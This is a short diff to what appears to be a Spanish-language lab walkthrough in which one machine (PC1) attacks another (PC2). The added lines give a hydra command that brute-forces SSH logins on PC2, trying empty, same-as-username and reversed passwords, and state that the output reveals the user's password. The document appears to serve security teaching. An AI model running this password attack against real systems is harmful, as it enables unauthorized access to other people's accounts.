@@ -36,6 +36,12 @@
 ++ PC1 Ctrl + C (salir del archivo)
 ++ PC1 exit (salir de metaexploit)
 ++ PC1 man hydra (Ver informacion del programa hydra. Usaremos hydra para realizar un ataque de fuerza bruta y tener controlar por ssh el PC2)
+++ PC1 hydra -l <nombre_usuario> -e nsr <ip_PC2> ssh
+++ PC1 Enter
+++ PC1 Se nos mostrarán los resultados tras el ataque indicando el password correspondiente al usuario
+
+
+
 
 
 
